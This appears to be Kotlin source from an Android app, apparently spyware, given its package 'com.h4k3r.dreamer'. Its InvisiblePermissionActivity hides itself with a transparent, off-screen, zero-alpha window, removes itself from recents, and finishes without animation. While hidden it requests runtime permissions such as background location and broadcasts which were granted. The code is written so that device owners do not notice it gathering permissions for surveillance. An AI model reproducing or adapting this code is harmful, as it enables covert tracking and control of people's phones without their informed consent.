package com.h4k3r.dreamer

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat

class InvisiblePermissionActivity : Activity() {
    companion object {
        private const val TAG = "InvisiblePermissionActivity"
        private const val REQUEST_CODE_PERMISSION = 1001
    }

    private val handler = Handler(Looper.getMainLooper())
    private var silentMode = false
    private var isBackgroundLocation = false
    private var permissionNames: Array<String>? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make activity completely invisible
        setupInvisibleActivity()

        // Handle intent
        handlePermissionRequest()
    }

    private fun setupInvisibleActivity() {
        // Set transparent theme and make invisible
        setTheme(android.R.style.Theme_Translucent_NoTitleBar)

        // Create invisible view
        val view = View(this).apply {
            visibility = View.GONE
        }
        setContentView(view)

        // Configure window for invisibility
        window.apply {
            setFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            )

            // Make window invisible
            attributes = attributes.apply {
                width = 1
                height = 1
                x = -1000
                y = -1000
                alpha = 0.0f
            }
        }

        // Remove from recents
        setTaskDescription(android.app.ActivityManager.TaskDescription(null, null, 0))
    }

    private fun handlePermissionRequest() {
        val silentPermissions = intent.getStringArrayExtra("silent_permissions")
        permissionNames = intent.getStringArrayExtra("permission_names")
        silentMode = intent.getBooleanExtra("silent_mode", false)
        isBackgroundLocation = intent.getBooleanExtra("is_background_location", false)

        if (silentPermissions != null && silentPermissions.isNotEmpty()) {
            Log.d(TAG, "Processing ${silentPermissions.size} permissions silently")

            if (silentMode) {
                // In silent mode, request permissions immediately without any UI
                handler.postDelayed({
                    ActivityCompat.requestPermissions(
                        this,
                        silentPermissions,
                        REQUEST_CODE_PERMISSION
                    )
                }, 100) // Minimal delay
            } else {
                // Original behavior with some UI feedback
                handler.postDelayed({
                    ActivityCompat.requestPermissions(
                        this,
                        silentPermissions,
                        REQUEST_CODE_PERMISSION
                    )
                }, 500)
            }
        } else {
            Log.e(TAG, "No permissions to request")
            finishSilently()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE_PERMISSION) {
            val results = mutableListOf<String>()
            val denied = mutableListOf<String>()

            permissions.forEachIndexed { index, permission ->
                if (grantResults[index] == PackageManager.PERMISSION_GRANTED) {
                    results.add(permission)
                    Log.d(TAG, "Permission granted silently: $permission")
                } else {
                    denied.add(permission)
                    Log.d(TAG, "Permission denied silently: $permission")
                }
            }

            // Report results via broadcast
            reportResults(results, denied)

            // Finish activity silently
            finishSilently()
        }
    }

    private fun reportResults(granted: List<String>, denied: List<String>) {
        try {
            val resultIntent = Intent("com.h4k3r.dreamer.SILENT_PERMISSION_RESULT").apply {
                putExtra("granted_permissions", granted.toTypedArray())
                putExtra("denied_permissions", denied.toTypedArray())
                putExtra("permission_names", permissionNames)
                putExtra("silent_mode", silentMode)
                putExtra("is_background_location", isBackgroundLocation)
            }
            sendBroadcast(resultIntent)

            Log.d(TAG, "Silent permission results reported: ${granted.size} granted, ${denied.size} denied")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to report permission results: ${e.message}")
        }
    }

    private fun finishSilently() {
        // Finish without any animations or transitions
        handler.postDelayed({
            finish()
            overridePendingTransition(0, 0) // No animation
        }, 200)
    }

    override fun onResume() {
        super.onResume()
        // Ensure activity remains invisible
        window.decorView.alpha = 0.0f
    }

    override fun onPause() {
        super.onPause()
        // Clean finish if needed
        if (isFinishing) {
            overridePendingTransition(0, 0)
        }
    }
}